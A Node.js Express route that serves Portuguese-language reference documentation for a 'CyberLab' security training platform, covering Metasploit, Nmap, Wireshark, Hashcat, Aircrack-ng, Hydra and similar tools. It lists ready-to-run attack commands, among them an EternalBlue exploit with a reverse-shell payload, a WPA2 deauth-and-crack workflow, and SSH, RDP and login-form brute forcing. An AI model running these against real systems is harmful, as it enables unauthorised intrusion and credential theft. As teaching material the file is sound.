const express = require('express');
const router = express.Router();

/**
 * GET /api/docs/generate
 * Gera documentação completa do sistema com foco em Cibersegurança
 */
router.get('/generate', async (req, res) => {
  try {
    const documentation = {
      title: 'CyberLab - Documentação Completa de Cibersegurança',
      version: '4.0.0',
      generated: new Date().toISOString(),
      sections: [
        {
          title: '🔐 Visão Geral',
          content: `Este sistema é uma plataforma educacional completa de análise e teste de segurança em redes e sistemas, desenvolvida para profissionais de cibersegurança, pentesters, analistas de segurança e entusiastas.

          Oferece funcionalidades abrangentes de análise de rede, detecção de vulnerabilidades, testes de penetração educacionais, análise forense digital, auditoria de redes sem fio, criptografia e muito mais.

          O CyberLab integra as principais ferramentas do ecossistema de segurança da informação, permitindo aprendizado prático e aplicação de técnicas avançadas de ethical hacking.`
        },

        // ========== METASPLOIT FRAMEWORK ==========
        {
          title: '💥 Metasploit Framework',
          content: `O Metasploit Framework é a plataforma de testes de penetração mais utilizada no mundo, desenvolvida pela Rapid7. É uma ferramenta essencial para profissionais de segurança que realizam testes de penetração e avaliações de vulnerabilidades.`,
          subsections: [
            {
              subtitle: '📌 Funcionalidades Principais',
              features: [
                {
                  name: 'Exploits',
                  description: 'Mais de 2.000 exploits verificados para diversas vulnerabilidades conhecidas em sistemas Windows, Linux, macOS, aplicações web e dispositivos IoT.'
                },
                {
                  name: 'Payloads',
                  description: 'Código executado após exploração bem-sucedida. Inclui Meterpreter (shell avançado), reverse shells, bind shells e payloads customizados.'
                },
                {
                  name: 'Auxiliares',
                  description: 'Módulos para scanning, fuzzing, sniffing e denial of service (DoS). Incluem scanners de portas, crackers de protocolos e analisadores de tráfego.'
                },
                {
                  name: 'Post-Exploitation',
                  description: 'Ferramentas para manter acesso, escalar privilégios, coletar credenciais, fazer pivoting e movimentação lateral na rede.'
                },
                {
                  name: 'Encoders',
                  description: 'Codificadores para evitar detecção por antivírus e sistemas de prevenção de intrusão (IPS).'
                }
              ]
            },
            {
              subtitle: '🚀 Comandos Essenciais',
              commands: [
                {
                  command: 'msfconsole',
                  description: 'Inicia o console principal do Metasploit',
                  example: '$ msfconsole'
                },
                {
                  command: 'search',
                  description: 'Busca por exploits, payloads ou módulos',
                  example: 'msf6 > search type:exploit platform:windows smb'
                },
                {
                  command: 'use',
                  description: 'Seleciona um módulo específico',
                  example: 'msf6 > use exploit/windows/smb/ms17_010_eternalblue'
                },
                {
                  command: 'show options',
                  description: 'Exibe opções configuráveis do módulo',
                  example: 'msf6 exploit(ms17_010_eternalblue) > show options'
                },
                {
                  command: 'set RHOSTS',
                  description: 'Define o alvo do ataque',
                  example: 'msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100'
                },
                {
                  command: 'set PAYLOAD',
                  description: 'Define o payload a ser usado',
                  example: 'msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp'
                },
                {
                  command: 'exploit / run',
                  description: 'Executa o exploit configurado',
                  example: 'msf6 exploit(ms17_010_eternalblue) > exploit'
                },
                {
                  command: 'sessions',
                  description: 'Lista e gerencia sessões ativas',
                  example: 'msf6 > sessions -l'
                },
                {
                  command: 'db_nmap',
                  description: 'Executa Nmap e armazena resultados no banco de dados',
                  example: 'msf6 > db_nmap -sV -A 192.168.1.0/24'
                }
              ]
            },
            {
              subtitle: '🎯 Casos de Uso',
              usecases: [
                'Testes de penetração em redes corporativas',
                'Validação de patches de segurança',
                'Desenvolvimento de exploits customizados',
                'Treinamento de equipes de segurança',
                'Red Team operations',
                'Simulação de ataques APT (Advanced Persistent Threat)'
              ]
            }
          ]
        },

        // ========== NMAP ==========
        {
          title: '🔍 Nmap (Network Mapper)',
          content: `Nmap é a ferramenta de scanning de rede mais popular e poderosa do mundo. Criada por Gordon Lyon (Fyodor), é usada para descoberta de rede, auditoria de segurança, inventário de rede e muito mais.`,
          subsections: [
            {
              subtitle: '📌 Técnicas de Scan',
              features: [
                {
                  name: 'TCP SYN Scan (-sS)',
                  description: 'Scan stealth que não completa o handshake TCP. Rápido e discreto, é o scan padrão quando executado com privilégios de root.'
                },
                {
                  name: 'TCP Connect Scan (-sT)',
                  description: 'Completa o handshake TCP. Usado quando não há privilégios de root, mas é mais detectável.'
                },
                {
                  name: 'UDP Scan (-sU)',
                  description: 'Scan de portas UDP. Essencial para descobrir serviços como DNS, SNMP, DHCP.'
                },
                {
                  name: 'Version Detection (-sV)',
                  description: 'Detecta versões de serviços em portas abertas. Crucial para identificar vulnerabilidades específicas.'
                },
                {
                  name: 'OS Detection (-O)',
                  description: 'Identifica o sistema operacional através de fingerprinting de pacotes TCP/IP.'
                },
                {
                  name: 'Script Scan (-sC ou --script)',
                  description: 'Executa scripts NSE (Nmap Scripting Engine) para detecção avançada de vulnerabilidades.'
                }
              ]
            },
            {
              subtitle: '🚀 Comandos Essenciais',
              commands: [
                {
                  command: 'Scan Básico',
                  description: 'Scan simples de host único',
                  example: '$ nmap 192.168.1.1'
                },
                {
                  command: 'Scan de Rede Completa',
                  description: 'Scan de toda a subnet',
                  example: '$ nmap 192.168.1.0/24'
                },
                {
                  command: 'Scan Agressivo',
                  description: 'Ativa OS detection, version detection, script scanning e traceroute',
                  example: '$ nmap -A 192.168.1.1'
                },
                {
                  command: 'Scan Stealth',
                  description: 'SYN scan sem completar handshake',
                  example: '$ sudo nmap -sS 192.168.1.1'
                },
                {
                  command: 'Scan de Portas Específicas',
                  description: 'Scan apenas de portas especificadas',
                  example: '$ nmap -p 22,80,443,3306 192.168.1.1'
                },
                {
                  command: 'Scan de Todas as Portas',
                  description: 'Scan das 65535 portas',
                  example: '$ nmap -p- 192.168.1.1'
                },
                {
                  command: 'Detecção de Vulnerabilidades',
                  description: 'Usa scripts para detectar vulnerabilidades conhecidas',
                  example: '$ nmap --script vuln 192.168.1.1'
                },
                {
                  command: 'Scan Rápido',
                  description: 'Scan apenas das 100 portas mais comuns',
                  example: '$ nmap -F 192.168.1.1'
                },
                {
                  command: 'Bypass de Firewall',
                  description: 'Fragmentação de pacotes para evitar IDS/IPS',
                  example: '$ nmap -f 192.168.1.1'
                },
                {
                  command: 'Output em XML',
                  description: 'Salva resultados em formato XML para processamento',
                  example: '$ nmap -oX scan_results.xml 192.168.1.1'
                }
              ]
            },
            {
              subtitle: '📜 NSE Scripts Importantes',
              scripts: [
                'http-enum - Enumera diretórios e arquivos em servidores web',
                'smb-vuln-* - Detecta vulnerabilidades SMB (EternalBlue, MS08-067)',
                'ssl-heartbleed - Detecta vulnerabilidade Heartbleed em SSL/TLS',
                'ssh-brute - Brute force em SSH',
                'dns-zone-transfer - Tenta transferência de zona DNS',
                'ftp-anon - Detecta FTP com login anônimo',
                'mysql-empty-password - Verifica MySQL sem senha',
                'smb-os-discovery - Descobre informações do SO via SMB'
              ]
            }
          ]
        },

        // ========== WIRESHARK ==========
        {
          title: '📡 Wireshark & TShark',
          content: `Wireshark é o analisador de protocolos de rede mais usado no mundo. Permite capturar e inspecionar dados que trafegam na rede em tempo real. TShark é a versão de linha de comando, ideal para automação.`,
          subsections: [
            {
              subtitle: '📌 Funcionalidades',
              features: [
                {
                  name: 'Captura de Pacotes',
                  description: 'Captura tráfego em tempo real de interfaces de rede (Ethernet, WiFi, Bluetooth, USB).'
                },
                {
                  name: 'Análise Profunda de Protocolos',
                  description: 'Decodifica centenas de protocolos: TCP, UDP, HTTP, HTTPS, DNS, SMTP, FTP, SMB, SSH, TLS, etc.'
                },
                {
                  name: 'Filtros Avançados',
                  description: 'Display filters e capture filters para isolar tráfego específico.'
                },
                {
                  name: 'Reconstrução de Sessões',
                  description: 'Reconstrói sessões TCP, HTTP e outros protocolos para análise completa de conversas.'
                },
                {
                  name: 'Detecção de Anomalias',
                  description: 'Identifica comportamentos suspeitos, ataques e problemas de rede.'
                },
                {
                  name: 'Exportação de Objetos',
                  description: 'Extrai arquivos transferidos via HTTP, FTP, SMB, etc.'
                }
              ]
            },
            {
              subtitle: '🔬 Display Filters Essenciais',
              filters: [
                {
                  filter: 'ip.addr == 192.168.1.1',
                  description: 'Tráfego de/para um IP específico'
                },
                {
                  filter: 'tcp.port == 80 || tcp.port == 443',
                  description: 'Tráfego HTTP e HTTPS'
                },
                {
                  filter: 'http.request',
                  description: 'Apenas requisições HTTP'
                },
                {
                  filter: 'dns',
                  description: 'Todo tráfego DNS'
                },
                {
                  filter: 'tcp.flags.syn == 1 && tcp.flags.ack == 0',
                  description: 'Pacotes SYN (início de conexão)'
                },
                {
                  filter: 'ftp',
                  description: 'Tráfego FTP (útil para capturar credenciais)'
                },
                {
                  filter: 'smtp || pop || imap',
                  description: 'Tráfego de email'
                },
                {
                  filter: '!(arp || icmp || dns)',
                  description: 'Exclui tráfego comum de broadcast'
                },
                {
                  filter: 'http contains "password"',
                  description: 'Requisições HTTP que contêm "password"'
                },
                {
                  filter: 'ssl.handshake',
                  description: 'Handshakes SSL/TLS'
                }
              ]
            },
            {
              subtitle: '⚡ TShark - Linha de Comando',
              commands: [
                {
                  command: 'Captura Básica',
                  description: 'Captura pacotes da interface especificada',
                  example: '$ tshark -i eth0'
                },
                {
                  command: 'Captura com Filtro',
                  description: 'Captura apenas tráfego HTTP',
                  example: '$ tshark -i eth0 -f "tcp port 80"'
                },
                {
                  command: 'Salvar em Arquivo',
                  description: 'Salva captura em arquivo PCAP',
                  example: '$ tshark -i eth0 -w capture.pcap'
                },
                {
                  command: 'Ler Arquivo PCAP',
                  description: 'Analisa arquivo PCAP existente',
                  example: '$ tshark -r capture.pcap'
                },
                {
                  command: 'Extrair Credenciais HTTP',
                  description: 'Procura por usuários e senhas em HTTP',
                  example: '$ tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data'
                },
                {
                  command: 'Estatísticas de Protocolos',
                  description: 'Exibe hierarquia de protocolos capturados',
                  example: '$ tshark -r capture.pcap -q -z io,phs'
                }
              ]
            },
            {
              subtitle: '🎯 Casos de Uso',
              usecases: [
                'Análise forense de incidentes de segurança',
                'Detecção de malware e C&C (Command and Control)',
                'Captura de credenciais em texto claro',
                'Análise de ataques Man-in-the-Middle',
                'Troubleshooting de problemas de rede',
                'Identificação de exfiltração de dados',
                'Análise de protocolo para desenvolvimento',
                'Detecção de scans e reconnaissance'
              ]
            }
          ]
        },

        // ========== OWASP ZAP ==========
        {
          title: '🕷️ OWASP ZAP (Zed Attack Proxy)',
          content: `OWASP ZAP é um scanner de segurança para aplicações web, mantido pela OWASP Foundation. É uma das ferramentas mais populares para encontrar vulnerabilidades em aplicações web durante desenvolvimento e testes.`,
          subsections: [
            {
              subtitle: '📌 Funcionalidades',
              features: [
                {
                  name: 'Spider Automático',
                  description: 'Crawl automático de aplicações web para descobrir todas as URLs, formulários e funcionalidades.'
                },
                {
                  name: 'Scanner de Vulnerabilidades',
                  description: 'Detecção automática de vulnerabilidades OWASP Top 10: SQL Injection, XSS, CSRF, etc.'
                },
                {
                  name: 'Intercepting Proxy',
                  description: 'Intercepta e modifica requisições HTTP/HTTPS entre navegador e servidor.'
                },
                {
                  name: 'Fuzzing',
                  description: 'Testes de fuzzing para descobrir inputs que causam comportamentos inesperados.'
                },
                {
                  name: 'API Testing',
                  description: 'Suporte para testes de APIs REST, SOAP e GraphQL.'
                },
                {
                  name: 'Authentication',
                  description: 'Suporte para diferentes métodos de autenticação (form-based, OAuth, JWT).'
                }
              ]
            },
            {
              subtitle: '🔍 Vulnerabilidades Detectadas',
              vulnerabilities: [
                'SQL Injection (SQLi) - Injeção de código SQL em inputs',
                'Cross-Site Scripting (XSS) - Injeção de JavaScript malicioso',
                'Cross-Site Request Forgery (CSRF) - Execução de ações não autorizadas',
                'Path Traversal - Acesso a arquivos do sistema',
                'Remote Code Execution (RCE) - Execução de código remoto',
                'Insecure Deserialization - Deserialização insegura',
                'XML External Entity (XXE) - Processamento inseguro de XML',
                'Security Misconfiguration - Configurações inseguras',
                'Sensitive Data Exposure - Exposição de dados sensíveis',
                'Broken Authentication - Falhas de autenticação',
                'Broken Access Control - Falhas de controle de acesso'
              ]
            },
            {
              subtitle: '🚀 Modos de Operação',
              modes: [
                {
                  name: 'Safe Mode',
                  description: 'Apenas observação passiva, sem ataques ativos. Ideal para ambientes de produção.'
                },
                {
                  name: 'Protected Mode',
                  description: 'Ataques limitados apenas a domínios autorizados.'
                },
                {
                  name: 'Standard Mode',
                  description: 'Modo padrão com todas as funcionalidades.'
                },
                {
                  name: 'Attack Mode',
                  description: 'Modo agressivo com todos os testes de vulnerabilidade.'
                }
              ]
            }
          ]
        },

        // ========== NESSUS ==========
        {
          title: '🛡️ Nessus',
          content: `Nessus é um scanner de vulnerabilidades líder de mercado, desenvolvido pela Tenable. É usado para identificar vulnerabilidades, malware, configurações incorretas e problemas de compliance.`,
          subsections: [
            {
              subtitle: '📌 Capacidades',
              features: [
                {
                  name: 'Vulnerability Scanning',
                  description: 'Mais de 150.000 plugins de detecção de vulnerabilidades, cobrindo CVEs, configurações e malware.'
                },
                {
                  name: 'Compliance Auditing',
                  description: 'Verifica compliance com PCI DSS, HIPAA, CIS Benchmarks, NIST, etc.'
                },
                {
                  name: 'Web Application Scanning',
                  description: 'Detecção de vulnerabilidades em aplicações web (SQL injection, XSS, etc.).'
                },
                {
                  name: 'Network Discovery',
                  description: 'Descoberta automática de ativos na rede.'
                },
                {
                  name: 'Credentialed Scans',
                  description: 'Scans autenticados para análise profunda de sistemas.'
                },
                {
                  name: 'Continuous Monitoring',
                  description: 'Monitoramento contínuo de ativos e detecção de mudanças.'
                }
              ]
            },
            {
              subtitle: '🎯 Tipos de Scan',
              scans: [
                {
                  name: 'Basic Network Scan',
                  description: 'Scan básico para descoberta de hosts e serviços'
                },
                {
                  name: 'Advanced Scan',
                  description: 'Scan customizado com opções avançadas'
                },
                {
                  name: 'Web Application Tests',
                  description: 'Testes específicos para aplicações web'
                },
                {
                  name: 'Malware Scan',
                  description: 'Detecção de malware e backdoors'
                },
                {
                  name: 'Policy Compliance',
                  description: 'Verificação de compliance com políticas'
                },
                {
                  name: 'Credentialed Patch Audit',
                  description: 'Auditoria de patches instalados'
                }
              ]
            }
          ]
        },

        // ========== NIKTO ==========
        {
          title: '🔎 Nikto',
          content: `Nikto é um scanner de vulnerabilidades para servidores web de código aberto. Realiza testes abrangentes em servidores web para identificar arquivos perigosos, versões desatualizadas de software e problemas de configuração.`,
          subsections: [
            {
              subtitle: '📌 Verificações Realizadas',
              checks: [
                'Mais de 6.700 arquivos e scripts potencialmente perigosos',
                'Versões desatualizadas de mais de 1.250 servidores',
                'Problemas específicos de versões em mais de 270 servidores',
                'Configurações inseguras e headers HTTP mal configurados',
                'Arquivos e diretórios padrão de instalação',
                'Métodos HTTP perigosos habilitados',
                'Certificados SSL expirados ou inválidos',
                'Clickjacking e outras vulnerabilidades de headers'
              ]
            },
            {
              subtitle: '🚀 Comandos Essenciais',
              commands: [
                {
                  command: 'Scan Básico',
                  description: 'Scan básico de servidor web',
                  example: '$ nikto -h http://target.com'
                },
                {
                  command: 'Scan HTTPS',
                  description: 'Scan de servidor HTTPS',
                  example: '$ nikto -h https://target.com'
                },
                {
                  command: 'Scan com Porta Específica',
                  description: 'Scan em porta não padrão',
                  example: '$ nikto -h 192.168.1.1 -p 8080'
                },
                {
                  command: 'Scan com Tuning',
                  description: 'Scan com testes específicos (1=Interesting File, 2=Misconfiguration, etc.)',
                  example: '$ nikto -h target.com -Tuning 1234'
                },
                {
                  command: 'Output em Arquivo',
                  description: 'Salva resultados em arquivo',
                  example: '$ nikto -h target.com -o results.html -Format html'
                },
                {
                  command: 'Scan Stealth',
                  description: 'Scan lento para evitar detecção',
                  example: '$ nikto -h target.com -T 2'
                }
              ]
            }
          ]
        },

        // ========== APKTOOL ==========
        {
          title: '📱 APKTool',
          content: `APKTool é uma ferramenta para engenharia reversa de aplicativos Android (arquivos APK). Permite descompilar, modificar e recompilar aplicativos Android para análise de segurança.`,
          subsections: [
            {
              subtitle: '📌 Funcionalidades',
              features: [
                {
                  name: 'Decodificação de Recursos',
                  description: 'Decodifica arquivos de recursos (XML, images) para formato legível.'
                },
                {
                  name: 'Desmontagem de Código',
                  description: 'Converte DEX (Dalvik Executable) para Smali (assembly Android).'
                },
                {
                  name: 'Reconstrução de APK',
                  description: 'Reconstrói o APK após modificações.'
                },
                {
                  name: 'Análise de Manifest',
                  description: 'Permite visualizar e editar AndroidManifest.xml.'
                },
                {
                  name: 'Extração de Assets',
                  description: 'Extrai todos os assets e recursos do aplicativo.'
                }
              ]
            },
            {
              subtitle: '🚀 Comandos',
              commands: [
                {
                  command: 'Descompilar APK',
                  description: 'Descompila APK para análise',
                  example: '$ apktool d app.apk'
                },
                {
                  command: 'Recompilar APK',
                  description: 'Reconstrói APK após modificações',
                  example: '$ apktool b app/ -o modified.apk'
                },
                {
                  command: 'Descompilar sem Resources',
                  description: 'Descompila apenas código',
                  example: '$ apktool d app.apk -r'
                },
                {
                  command: 'Descompilar sem Sources',
                  description: 'Extrai apenas resources',
                  example: '$ apktool d app.apk -s'
                }
              ]
            },
            {
              subtitle: '🎯 Casos de Uso',
              usecases: [
                'Análise de segurança de aplicativos Android',
                'Detecção de malware em apps',
                'Verificação de hardcoded secrets (API keys, senhas)',
                'Análise de permissões excessivas',
                'Identificação de bibliotecas vulneráveis',
                'Reverse engineering para pesquisa de segurança'
              ]
            }
          ]
        },

        // ========== HASHCAT ==========
        {
          title: '💎 Hashcat',
          content: `Hashcat é a ferramenta de recuperação de senhas mais rápida do mundo. Utiliza o poder das GPUs para quebrar hashes de senhas em velocidades impressionantes, suportando mais de 300 algoritmos de hash.`,
          subsections: [
            {
              subtitle: '📌 Algoritmos Suportados',
              algorithms: [
                'MD5, SHA1, SHA256, SHA512',
                'NTLM, NTLMv2 (Windows)',
                'bcrypt, scrypt, Argon2',
                'MySQL, PostgreSQL, Oracle',
                'WPA/WPA2 (WiFi)',
                'VeraCrypt, TrueCrypt, LUKS',
                'Bitcoin/Litecoin wallets',
                'PDF, ZIP, RAR, 7z passwords',
                'Office documents (Word, Excel)',
                'Kerberos TGT/TGS'
              ]
            },
            {
              subtitle: '🎯 Modos de Ataque',
              modes: [
                {
                  name: 'Straight (0)',
                  description: 'Ataque de dicionário simples - testa cada palavra da wordlist'
                },
                {
                  name: 'Combination (1)',
                  description: 'Combina palavras de duas wordlists'
                },
                {
                  name: 'Brute-force (3)',
                  description: 'Testa todas as combinações possíveis até certo comprimento'
                },
                {
                  name: 'Hybrid Wordlist + Mask (6)',
                  description: 'Wordlist com sufixos/prefixos de brute-force'
                },
                {
                  name: 'Hybrid Mask + Wordlist (7)',
                  description: 'Brute-force com sufixos/prefixos de wordlist'
                },
                {
                  name: 'Association (9)',
                  description: 'Ataque baseado em associação'
                }
              ]
            },
            {
              subtitle: '🚀 Comandos Essenciais',
              commands: [
                {
                  command: 'Ataque de Dicionário',
                  description: 'Quebra hash usando wordlist',
                  example: '$ hashcat -m 0 -a 0 hash.txt wordlist.txt'
                },
                {
                  command: 'Brute Force',
                  description: 'Ataque de força bruta com máscara',
                  example: '$ hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a'
                },
                {
                  command: 'WPA/WPA2 Handshake',
                  description: 'Quebra handshake WiFi',
                  example: '$ hashcat -m 22000 -a 0 handshake.hc22000 wordlist.txt'
                },
                {
                  command: 'NTLM Hash',
                  description: 'Quebra hash NTLM (Windows)',
                  example: '$ hashcat -m 1000 -a 0 ntlm.txt rockyou.txt'
                },
                {
                  command: 'Com Rules',
                  description: 'Aplica regras de mutação à wordlist',
                  example: '$ hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/best64.rule'
                },
                {
                  command: 'Benchmark GPU',
                  description: 'Testa performance da GPU',
                  example: '$ hashcat -b'
                },
                {
                  command: 'Restaurar Sessão',
                  description: 'Continua ataque interrompido',
                  example: '$ hashcat --session mysession --restore'
                }
              ]
            },
            {
              subtitle: '🔤 Máscaras de Caracteres',
              masks: [
                '?l = letras minúsculas (a-z)',
                '?u = letras maiúsculas (A-Z)',
                '?d = dígitos (0-9)',
                '?s = símbolos especiais',
                '?a = todos os caracteres (?l?u?d?s)',
                '?b = todos os bytes (0x00-0xFF)',
                'Exemplo: ?u?l?l?l?d?d = Password12'
              ]
            }
          ]
        },

        // ========== AIRCRACK-NG ==========
        {
          title: '📶 Aircrack-ng',
          content: `Aircrack-ng é um conjunto completo de ferramentas para auditoria de segurança em redes WiFi. Permite monitorar, atacar, testar e quebrar a segurança de redes sem fio WEP e WPA/WPA2-PSK.`,
          subsections: [
            {
              subtitle: '🛠️ Ferramentas do Suite',
              tools: [
                {
                  name: 'airmon-ng',
                  description: 'Coloca interface WiFi em modo monitor para captura de pacotes.'
                },
                {
                  name: 'airodump-ng',
                  description: 'Captura pacotes 802.11 e descobre redes WiFi disponíveis.'
                },
                {
                  name: 'aireplay-ng',
                  description: 'Gera tráfego para capturar handshakes e IVs. Realiza ataques de deauth, fake authentication, etc.'
                },
                {
                  name: 'aircrack-ng',
                  description: 'Quebra chaves WEP e WPA/WPA2-PSK usando pacotes capturados.'
                },
                {
                  name: 'airdecap-ng',
                  description: 'Descriptografa arquivos de captura WEP/WPA.'
                },
                {
                  name: 'airbase-ng',
                  description: 'Cria fake access points (Evil Twin).'
                },
                {
                  name: 'airdecloak-ng',
                  description: 'Remove cloaking de redes ocultas.'
                },
                {
                  name: 'airserv-ng',
                  description: 'Permite acesso remoto a placas wireless.'
                }
              ]
            },
            {
              subtitle: '🚀 Workflow de Ataque WPA2',
              workflow: [
                {
                  step: 1,
                  title: 'Colocar Interface em Modo Monitor',
                  command: '$ airmon-ng start wlan0'
                },
                {
                  step: 2,
                  title: 'Descobrir Redes WiFi',
                  command: '$ airodump-ng wlan0mon'
                },
                {
                  step: 3,
                  title: 'Capturar Handshake',
                  command: '$ airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon'
                },
                {
                  step: 4,
                  title: 'Forçar Deauth (capturar handshake)',
                  command: '$ aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon'
                },
                {
                  step: 5,
                  title: 'Quebrar a Senha',
                  command: '$ aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap'
                }
              ]
            },
            {
              subtitle: '🎯 Ataques Suportados',
              attacks: [
                'Deauthentication Attack - Desconecta clientes do AP',
                'Fake Authentication - Autentica com AP para injection',
                'Interactive Packet Replay - Replay de pacotes capturados',
                'ARP Request Replay - Acelera captura de IVs (WEP)',
                'Fragmentation Attack - Obtém PRGA para WEP',
                'Caffe-Latte Attack - Quebra WEP sem AP',
                'Evil Twin Attack - Fake AP para captura de credenciais'
              ]
            }
          ]
        },

        // ========== CRIPTOGRAFIA ==========
        {
          title: '🔐 Criptografia de Arquivos e Projetos',
          content: `Técnicas e ferramentas para proteger dados sensíveis através de criptografia forte, garantindo confidencialidade e integridade das informações.`,
          subsections: [
            {
              subtitle: '📌 Ferramentas de Criptografia',
              tools: [
                {
                  name: 'OpenSSL',
                  description: 'Biblioteca de criptografia robusta para criptografar/descriptografar arquivos, gerar certificados e mais.'
                },
                {
                  name: 'GnuPG (GPG)',
                  description: 'Implementação completa do padrão OpenPGP para criptografia e assinatura digital.'
                },
                {
                  name: 'VeraCrypt',
                  description: 'Software de criptografia de disco que cria volumes criptografados.'
                },
                {
                  name: '7-Zip',
                  description: 'Compressor com suporte a criptografia AES-256.'
                },
                {
                  name: 'age',
                  description: 'Ferramenta moderna de criptografia de arquivos, simples e segura.'
                },
                {
                  name: 'Cryptomator',
                  description: 'Criptografia transparente para cloud storage.'
                }
              ]
            },
            {
              subtitle: '🚀 Comandos OpenSSL',
              commands: [
                {
                  command: 'Criptografar Arquivo (AES-256)',
                  description: 'Criptografa arquivo com AES-256-CBC',
                  example: '$ openssl enc -aes-256-cbc -salt -in file.txt -out file.txt.enc'
                },
                {
                  command: 'Descriptografar Arquivo',
                  description: 'Descriptografa arquivo criptografado',
                  example: '$ openssl enc -aes-256-cbc -d -in file.txt.enc -out file.txt'
                },
                {
                  command: 'Gerar Hash SHA-256',
                  description: 'Calcula hash SHA-256 de arquivo',
                  example: '$ openssl dgst -sha256 file.txt'
                },
                {
                  command: 'Criptografia com Senha',
                  description: 'Criptografa usando senha ao invés de chave',
                  example: '$ openssl enc -aes-256-cbc -pbkdf2 -in file.txt -out file.enc'
                },
                {
                  command: 'Gerar Chave Aleatória',
                  description: 'Gera chave aleatória de 32 bytes',
                  example: '$ openssl rand -hex 32'
                }
              ]
            },
            {
              subtitle: '🚀 Comandos GPG',
              commands: [
                {
                  command: 'Criptografar para Destinatário',
                  description: 'Criptografa arquivo para chave pública',
                  example: '$ gpg --encrypt --recipient user@email.com file.txt'
                },
                {
                  command: 'Criptografar Simétrico',
                  description: 'Criptografa com senha (sem par de chaves)',
                  example: '$ gpg --symmetric file.txt'
                },
                {
                  command: 'Descriptografar',
                  description: 'Descriptografa arquivo GPG',
                  example: '$ gpg --decrypt file.txt.gpg -o file.txt'
                },
                {
                  command: 'Assinar Arquivo',
                  description: 'Cria assinatura digital',
                  example: '$ gpg --sign file.txt'
                },
                {
                  command: 'Verificar Assinatura',
                  description: 'Verifica assinatura digital',
                  example: '$ gpg --verify file.txt.sig'
                }
              ]
            },
            {
              subtitle: '🎯 Melhores Práticas',
              practices: [
                'Use AES-256 ou ChaCha20 para criptografia simétrica',
                'Use RSA 4096 bits ou Curve25519 para criptografia assimétrica',
                'Sempre use salt e PBKDF2/Argon2 para derivação de chaves',
                'Armazene chaves separadamente dos dados criptografados',
                'Faça backup seguro das chaves de criptografia',
                'Use senhas fortes (mínimo 20 caracteres aleatórios)',
                'Criptografe backups antes de enviar para cloud',
                'Implemente rotação de chaves periodicamente'
              ]
            }
          ]
        },

        // ========== JOHN THE RIPPER ==========
        {
          title: '🔓 John the Ripper',
          content: `John the Ripper é uma das ferramentas de quebra de senhas mais antigas e respeitadas. Detecta automaticamente o tipo de hash e aplica técnicas otimizadas para quebrar senhas.`,
          subsections: [
            {
              subtitle: '📌 Modos de Ataque',
              modes: [
                {
                  name: 'Single Crack Mode',
                  description: 'Usa informações do sistema (username, GECOS) para gerar candidatos inteligentes.'
                },
                {
                  name: 'Wordlist Mode',
                  description: 'Ataque de dicionário com suporte a regras de mutação.'
                },
                {
                  name: 'Incremental Mode',
                  description: 'Brute-force inteligente baseado em análise estatística de senhas.'
                },
                {
                  name: 'External Mode',
                  description: 'Permite criar algoritmos customizados de geração de senhas.'
                }
              ]
            },
            {
              subtitle: '🚀 Comandos',
              commands: [
                {
                  command: 'Auto-detect e Quebrar',
                  description: 'Detecta tipo de hash e tenta quebrar',
                  example: '$ john hashes.txt'
                },
                {
                  command: 'Com Wordlist',
                  description: 'Ataque de dicionário',
                  example: '$ john --wordlist=rockyou.txt hashes.txt'
                },
                {
                  command: 'Com Rules',
                  description: 'Aplica regras de mutação',
                  example: '$ john --wordlist=wordlist.txt --rules hashes.txt'
                },
                {
                  command: 'Incremental',
                  description: 'Brute-force inteligente',
                  example: '$ john --incremental hashes.txt'
                },
                {
                  command: 'Mostrar Senhas Quebradas',
                  description: 'Exibe senhas já descobertas',
                  example: '$ john --show hashes.txt'
                },
                {
                  command: 'Hash Específico',
                  description: 'Força formato de hash específico',
                  example: '$ john --format=NT hashes.txt'
                }
              ]
            },
            {
              subtitle: '🔧 Formatos Suportados',
              formats: [
                'Unix crypt(3) - DES, MD5, Blowfish, SHA-256, SHA-512',
                'Windows LM, NTLM, NTLMv2',
                'Kerberos AFS, Kerberos 5 TGT',
                'MySQL, PostgreSQL, MS SQL',
                'PDF, ZIP, RAR passwords',
                'OpenSSH private keys',
                'Bitcoin/Litecoin wallets',
                'Apple Keychain, macOS passwords'
              ]
            }
          ]
        },

        // ========== HYDRA ==========
        {
          title: '💧 Hydra',
          content: `Hydra é uma das ferramentas de brute-force de login mais rápidas e flexíveis. Suporta mais de 50 protocolos diferentes, incluindo HTTP, FTP, SSH, Telnet, SMTP e muito mais.`,
          subsections: [
            {
              subtitle: '📌 Protocolos Suportados',
              protocols: [
                'HTTP/HTTPS (GET, POST, Form-based)',
                'FTP, FTPS',
                'SSH, SSHKEY',
                'Telnet, TelnetS',
                'SMTP, SMTP-ENUM',
                'POP3, POP3S, IMAP, IMAPS',
                'MySQL, PostgreSQL, MS-SQL, Oracle',
                'RDP (Remote Desktop)',
                'SMB, SMBNT',
                'SNMP, SNMP v3',
                'VNC',
                'LDAP, LDAP3',
                'SIP (VoIP)',
                'Redis, MongoDB'
              ]
            },
            {
              subtitle: '🚀 Comandos Essenciais',
              commands: [
                {
                  command: 'SSH Brute Force',
                  description: 'Ataque de força bruta em SSH',
                  example: '$ hydra -l admin -P passwords.txt ssh://192.168.1.1'
                },
                {
                  command: 'FTP com Usuário e Senha',
                  description: 'Testa combinações de usuários e senhas',
                  example: '$ hydra -L users.txt -P passwords.txt ftp://192.168.1.1'
                },
                {
                  command: 'HTTP POST Form',
                  description: 'Ataque em formulário de login web',
                  example: '$ hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"'
                },
                {
                  command: 'RDP Windows',
                  description: 'Brute force em Remote Desktop',
                  example: '$ hydra -l administrator -P passwords.txt rdp://192.168.1.1'
                },
                {
                  command: 'MySQL Database',
                  description: 'Ataque em banco de dados MySQL',
                  example: '$ hydra -l root -P passwords.txt mysql://192.168.1.1'
                },
                {
                  command: 'Threads Paralelas',
                  description: 'Aumenta número de threads para velocidade',
                  example: '$ hydra -l admin -P passwords.txt -t 16 ssh://target'
                },
                {
                  command: 'Verbose Output',
                  description: 'Mostra cada tentativa',
                  example: '$ hydra -l admin -P passwords.txt -V ssh://target'
                },
                {
